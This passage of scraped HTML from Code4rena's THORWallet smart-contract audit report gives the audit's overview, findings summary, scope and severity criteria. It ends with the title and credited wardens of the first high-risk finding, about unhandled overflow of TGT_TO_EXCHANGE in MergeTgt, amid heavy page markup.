5.5C7.68629 5.5 5 8.18629 5 11.5C5 14.8137 7.68629 17.5 11 17.5C14.3137 17.5 17 14.8137 17 11.5C17 8.18629 14.3137 5.5 11 5.5ZM3 11.5C3 7.08172 6.58172 3.5 11 3.5C15.4183 3.5 19 7.08172 19 11.5C19 15.9183 15.4183 19.5 11 19.5C6.58172 19.5 3 15.9183 3 11.5Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11 10.5C11.5523 10.5 12 10.9477 12 11.5V14.7C12 15.2523 11.5523 15.7 11 15.7C10.4477 15.7 10 15.2523 10 14.7V11.5C10 10.9477 10.4477 10.5 11 10.5Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10 8.29974C10 7.74746 10.4477 7.29974 11 7.29974H11.01C11.5623 7.29974 12.01 7.74746 12.01 8.29974C12.01 8.85203 11.5623 9.29974 11.01 9.29974H11C10.4477 9.29974 10 8.85203 10 8.29974Z"></path></g></g></svg><p class="core-app--link--label">Docs</p><svg class="core-app--link--external" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M13.6778 4.8C13.1807 4.8 12.7778 4.39706 12.7778 3.9C12.7778 3.40294 13.1807 3 13.6778 3H18.5667C19.0637 3 19.4667 3.40294 19.4667 3.9V8.78889C19.4667 9.28595 19.0637 9.68889 18.5667 9.68889C18.0696 9.68889 17.6667 9.28595 17.6667 8.78889V6.07279L10.2401 13.4994C9.88861 13.8508 9.31876 13.8508 8.96729 13.4994C8.61582 13.1479 8.61582 12.578 8.96729 12.2266L16.3939 4.8H13.6778ZM5.52961 7.24448C5.3361 7.24448 5.15052 7.32135 5.01369 7.45818C4.87685 7.59501 4.79998 7.7806 4.79998 7.97411V16.9371C4.79998 17.1306 4.87685 17.3162 5.01369 17.453C5.15052 17.5898 5.3361 17.6667 5.52961 17.6667H14.4926C14.6861 17.6667 14.8717 17.5898 15.0085 17.453C15.1453 17.3162 15.2222 17.1306 15.2222 16.9371V12.0482C15.2222 11.5511 15.6251 11.1482 16.1222 11.1482C16.6193 11.1482 17.0222 11.5511 17.0222 12.0482V16.9371C17.0222 17.608 16.7557 18.2514 16.2813 18.7258C15.8069 19.2002 15.1635 19.4667 14.4926 19.4667H5.52961C4.85871 19.4667 4.21529 19.2002 3.74089 18.7258C3.2665 18.2514 2.99998 17.608 2.99998 16.9371V7.97411C2.99998 7.30321 3.2665 6.65979 3.74089 6.18539C4.21529 5.71099 4.85871 5.44448 5.52961 5.44448H10.4185C10.9156 5.44448 11.3185 5.84742 11.3185 6.34448C11.3185 6.84154 10.9156 7.24448 10.4185 7.24448H5.52961Z"></path></g></g></svg></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Support" href="https://code4rena.com/help"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11.2349 4.8C7.68095 4.8 4.7999 7.68105 4.7999 11.235C4.7999 12.7888 5.34945 14.2118 6.26567 15.3238C6.51173 15.6225 6.53935 16.045 6.33426 16.3731L5.52372 17.67H11.2349C14.7889 17.67 17.6699 14.789 17.6699 11.235C17.6699 7.68105 14.7889 4.8 11.2349 4.8ZM2.9999 11.235C2.9999 6.68693 6.68684 3 11.2349 3C15.783 3 19.4699 6.68693 19.4699 11.235C19.4699 15.7831 15.783 19.47 11.2349 19.47H3.8999C3.57273 19.47 3.27133 19.2925 3.11272 19.0063C2.95412 18.7201 2.9633 18.3704 3.1367 18.093L4.47913 15.9451C3.54708 14.6104 2.9999 12.9857 2.9999 11.235Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M11.1412 8.81802C10.8498 8.76805 10.5502 8.8228 10.2954 8.97256C10.0406 9.12232 9.84699 9.35744 9.7489 9.63627C9.58396 10.1052 9.07013 10.3516 8.60124 10.1866C8.13235 10.0217 7.88596 9.50784 8.0509 9.03895C8.29005 8.35912 8.76208 7.78587 9.38339 7.42072C10.0047 7.05557 10.7352 6.92209 11.4455 7.04393C12.1558 7.16576 12.8 7.53505 13.2641 8.08637C13.7281 8.63754 13.9821 9.3351 13.9812 10.0555C13.9808 11.2501 13.0967 12.0226 12.5046 12.4174C12.1811 12.633 11.864 12.7909 11.6313 12.8944C11.5137 12.9466 11.4144 12.9864 11.3424 13.0138C11.3064 13.0276 11.2769 13.0383 11.2552 13.046L11.2286 13.0553L11.2198 13.0583L11.2166 13.0594L11.2153 13.0599L11.2286 13.0553L11.2142 13.0602C10.7426 13.2174 10.2329 12.9626 10.0758 12.491C9.91858 12.0195 10.1734 11.5098 10.645 11.3526L10.6434 11.3531L10.6522 11.35C10.6621 11.3465 10.6789 11.3404 10.7016 11.3318C10.7473 11.3143 10.8161 11.2869 10.9002 11.2495C11.071 11.1736 11.2918 11.0626 11.5061 10.9197C11.9897 10.5973 12.1812 10.2942 12.1812 10.0548L12.1812 10.0535C12.1816 9.75789 12.0774 9.4717 11.8871 9.24557C11.6967 9.01945 11.4325 8.86799 11.1412 8.81802Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.0869 15.075C10.0869 14.578 10.4899 14.175 10.9869 14.175H10.9969C11.494 14.175 11.8969 14.578 11.8969 15.075C11.8969 15.5721 11.494 15.975 10.9969 15.975H10.9869C10.4899 15.975 10.0869 15.5721 10.0869 15.075Z"></path></g></g></svg><p class="core-app--link--label">Support</p></a></li></ul></section></div><div id="core-app--nav--tooltip" role="tooltip" class="core-app--nav--tooltip" style="display: none;"></div><div class="core-app--nav--footer"><button class="core-app--settings--submenu-trigger" aria-describedby="core-app--nav--tooltip" aria-label="User Options" type="button"><div class="avatar-c4 img-fill--cover " style="border-radius: 4px; width: 24px; height: 24px;"><img alt="Avatar for enthu2218" loading="lazy" decoding="async" data-nimg="fill" sizes="40px" srcset="/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fenthu2218&amp;w=3840&amp;q=75 3840w" src="./THORWallet_files/enthu2218.png" style="position: absolute; height: 100%; width: 100%; inset: 0px; color: transparent;"></div><strong class="username">enthu2218</strong><svg class="chevron-up" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.2636 6.2636C10.6151 5.91213 11.1849 5.91213 11.5364 6.2636L17.0364 11.7636C17.3879 12.1151 17.3879 12.6849 17.0364 13.0364C16.6849 13.3879 16.1151 13.3879 15.7636 13.0364L10.9 8.17279L6.0364 13.0364C5.68492 13.3879 5.11508 13.3879 4.7636 13.0364C4.41213 12.6849 4.41213 12.1151 4.7636 11.7636L10.2636 6.2636Z"></path></g></g></svg></button></div></nav><button type="button" aria-controls="core_app_nav" aria-expanded="true" aria-label="Collapse sidebar" class="core-app--nav--collapsible"><svg class="toggle-menu" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M10.5363 5.2636C10.8878 5.61508 10.8878 6.18492 10.5363 6.5364L6.1727 10.9L10.5363 15.2636C10.8878 15.6151 10.8878 16.1849 10.5363 16.5364C10.1848 16.8879 9.61498 16.8879 9.26351 16.5364L4.26351 11.5364C3.91204 11.1849 3.91204 10.6151 4.26351 10.2636L9.26351 5.2636C9.61498 4.91213 10.1848 4.91213 10.5363 5.2636ZM17.5363 5.2636C17.8878 5.61508 17.8878 6.18492 17.5363 6.5364L13.1727 10.9L17.5363 15.2636C17.8878 15.6151 17.8878 16.1849 17.5363 16.5364C17.1848 16.8879 16.615 16.8879 16.2635 16.5364L11.2635 11.5364C10.912 11.1849 10.912 10.6151 11.2635 10.2636L16.2635 5.2636C16.615 4.91213 17.1848 4.91213 17.5363 5.2636Z"></path></g></svg></button></div><main class="core-app--main sidebar--open"><div class="core-app-report"><header class="core-app--header no-print"><div class="core-app--header--left"><a class="core-app--header--redirect" href="https://code4rena.com/reports"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M13.0364 5.2636C13.3878 5.61508 13.3878 6.18492 13.0364 6.5364L8.17276 11.4L13.0364 16.2636C13.3878 16.6151 13.3878 17.1849 13.0364 17.5364C12.6849 17.8879 12.115 17.8879 11.7636 17.5364L6.26357 12.0364C5.9121 11.6849 5.9121 11.1151 6.26357 10.7636L11.7636 5.2636C12.115 4.91213 12.6849 4.91213 13.0364 5.2636Z"></path></g></svg><strong>Reports</strong></a><div class="core-app--header--filters"></div></div></header><a class="core-app-report__back-button limited-width" href="https://code4rena.com/reports">Reports</a><section class="core-app-report__top limited-width"><div class="core-app-report__top-content"><div class="core-app-report__project"><div class="core-app-report__project--top"><div class="core-app-report__project-link project-link"><a href="https://x.com/thorwallet" class="logo-64"><img alt="THORWallet" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="70px" srcset="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-Yf5zLz4KagP&amp;w=3840&amp;q=75 3840w" src="./THORWallet_files/upload-Yf5zLz4KagP.jpeg"></a></div><div class="core-app-report__details"><h1 class="type__headline__xs">THORWallet<!-- --> Findings &amp; Analysis Report</h1></div></div></div></div><ul class="core-app-report__details-grid"><div class="core-app-report__details-wrapper"><li class="core-app-report__published"><span class="core-app-report__grid-value">PUBLISHED <!-- -->Apr 15, 2025</span></li></div></ul></section><div class=" core-app-report__md-wrapper limited-width type__copy"><div class="core-app-report__container"><div class="core-app-report__contents markdown-body"><h1 style="position:relative;" id="overview"><a class="anchor before" aria-label="overview permalink" href="https://code4rena.com/reports/2025-02-thorwallet#overview"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Overview</h1>
<h2 style="position:relative;" id="about-c4"><a class="anchor before" aria-label="about c4 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#about-c4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>About C4</h2>
<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>
<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>
<p>During the audit outlined in this document, C4 conducted an analysis of the THORWallet smart contract system. The audit took place from February 20, 2025 to February 26, 2025.</p>
<p>This audit was judged by <a href="https://code4rena.com/@0xnev">0xnev</a>.</p>
<p>Final report assembled by Code4rena.</p>
<p>Following the C4 audit, 3 wardens (<a href="https://code4rena.com/@shaflow2">shaflow2</a>, <a href="https://code4rena.com/@web3km">web3km</a>, and <a href="https://code4rena.com/@kn0t">kn0t</a>) reviewed the mitigations for all identified issues; the <a href="https://code4rena.com/reports/2025-02-thorwallet#mitigation-review">mitigation review report</a> is appended below the audit report.</p>
<h1 style="position:relative;" id="summary"><a class="anchor before" aria-label="summary permalink" href="https://code4rena.com/reports/2025-02-thorwallet#summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h1>
<p>The C4 analysis yielded an aggregated total of 3 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 1 received a risk rating in the category of MEDIUM severity.</p>
<p>Additionally, C4 analysis included 9 reports detailing issues with a risk rating of LOW severity or non-critical. </p>
<p>All of the issues presented here are linked back to their original finding.</p>
<h1 style="position:relative;" id="scope"><a class="anchor before" aria-label="scope permalink" href="https://code4rena.com/reports/2025-02-thorwallet#scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scope</h1>
<p>The code under review can be found within the <a href="https://github.com/code-423n4/2025-02-thorwallet">C4 THORWallet repository</a>, and is composed of 2 smart contracts written in the Solidity programming language and includes 216 lines of Solidity code.</p>
<h1 style="position:relative;" id="severity-criteria"><a class="anchor before" aria-label="severity criteria permalink" href="https://code4rena.com/reports/2025-02-thorwallet#severity-criteria"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Criteria</h1>
<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>
<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>
<ul>
<li>Malicious Input Handling</li>
<li>Escalation of privileges</li>
<li>Arithmetic</li>
<li>Gas use</li>
</ul>
<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href="https://code4rena.com/">the C4 website</a>, specifically our section on <a href="https://docs.code4rena.com/awarding/judging-criteria/severity-categorization">Severity Categorization</a>.</p>
<h1 style="position:relative;" id="high-risk-findings-2"><a class="anchor before" aria-label="high risk findings 2 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#high-risk-findings-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>High Risk Findings (2)</h1>
<h2 style="position:relative;" id="h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period"><a class="anchor before" aria-label="h 1 mergetgt has no handling if tgttoexchange is exceeded during the exchange period permalink" href="https://code4rena.com/reports/2025-02-thorwallet#h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6">[H-1] MergeTgt has no handling if TGT<em>TO</em>EXCHANGE is exceeded during the exchange period</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-171">jsonDoge</a>, also found by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-88">0x41head</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-87">0xAsen</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-146">0xastronatey</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-473">0xbrett8571</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-218">0xd4ps</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-379">0xgh0stcybers3c</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-61">0xGondar</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-269">0xLeveler</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-789">0xlucky</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-584">0xTonraq</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-253">4B</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-783">Abhan</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-529">agadzhalov</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-49">anchabadze</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-705">arman</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-149">arnie</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-745">aster</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-411">Benterkiii</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-283">boredpukar</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-345">Bz</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-200">ChainSentry</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-201">ChainSentry</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-204">ChainSentry</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-493">Coldless</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-219">crmx_lom</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-701">Daniel_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-733">Daniel_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-10">Daniel526</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-12">Daniel526</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-667">DemoreX</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-766">dobrevaleri</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-108">eldar_m10v</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-790">ewwrekt</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-809">hjo</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-628">IceBear</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-491">Illoy-Scizceneghposter</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-652">Ishenxx</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-660">Ishenxx</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-661">Ishenxx</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-359">ITCruiser</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-174">jkk812812</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-453">KannAudits</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-720">KannAudits</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-433">kn0t</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-481">leegh</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-375">MSK</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-195">Mylifechangefast_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-197">Mylifechangefast_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-686">natachi</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-658">peanuts</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-565">phoenixV110</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-562">REKCAH</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-189">safie</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-184">saikumar279</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-250">Saurabh_Singh</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-403">shaflow2</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-140">silver_eth</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-635">sohrabhind</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-649">sohrabhind</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-535">Striking_Lions</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-792">Takarez</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-107">teoslaf</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-181">tpiliposian</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-426">UzeyirCh</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-616">w33kEd</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-603">wahedtalash77</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-114">web3km</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-56">web3km</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-639">yaioxy</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-221">zhanmingjing</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-147">zraxx</a>, and <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-236">ZZhelev</a></em></p>
<p><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81">https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81</a></p>
